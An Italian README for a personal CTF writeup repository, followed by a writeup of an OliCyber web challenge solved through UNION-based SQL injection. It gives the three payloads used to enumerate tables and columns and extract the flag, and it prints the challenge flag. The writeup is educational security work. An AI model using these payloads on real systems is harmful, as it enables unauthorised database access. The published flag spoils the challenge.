# CTF Writeups & HTB Machines 💀


In questo repository archiviamo tutte le writeups di CTF (Capture The Flag) e macchine HTB (Hack The Box) che ho completato.


## Contenuti 📚
- **CTF Writeups**: Soluzioni dettagliate delle sfide CTF
- **HTB Machines**: Guide complete per le macchine Hack The Box


## Contributi 🤝
Per contribuire con un writeup, contattami via email: `luca.crippa05@gmail.com`


## Licenza ⚖️
Repository condivisa per scopi educativi. Rispetta sempre le policy delle piattaforme quando condividi materiale.


---


# Writeup: Sn4ck sh3nan1gans 🍪


## Overview
- **Categoria:** Web
- **Autore:** lotus98
- **Difficoltà:** 🟡 186/500
- **Stato:** Up
- **URL:** http://sn4ck-sh3nan1gans.challs.olicyber.it


## Descrizione 📝
La challenge presenta una semplice pagina di login apparentemente innocua. Un'analisi più approfondita rivela una vulnerabilità SQL Injection che permette di estrarre informazioni dal database sottostante.


## Soluzione 🎯


### 1. Enumerazione Database
```sql
99999 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1
```
**Risultati:**
- Database: `challdb`
- Tabelle: `users`, `here_is_the_flag`


### 2. Enumerazione Colonne
```sql
99999 UNION SELECT concat(column_name) FROM information_schema.columns where table_name='here_is_the_flag' LIMIT 1 OFFSET 1
```
**Risultato:** Colonna `flag` identificata


### 3. Estrazione Flag
```sql
99999 UNION SELECT flag FROM here_is_the_flag LIMIT 1 OFFSET 0
```


## Flag 🏁
```
flag{W4sH_y0ur_HaNd5_b3f0Re_e4tin6_c0oki3s!}
```


## Lezioni Apprese 📚
- Importanza della sanitizzazione degli input utente
- Rischi delle vulnerabilità SQL Injection
- Tecniche di enumerazione database attraverso UNION SELECT


## Tools Utilizzati 🛠️
- Browser Web
- Burp Suite (opzionale per il testing)


---
*Writeup by Luca Crippa - Last Updated: 2024*
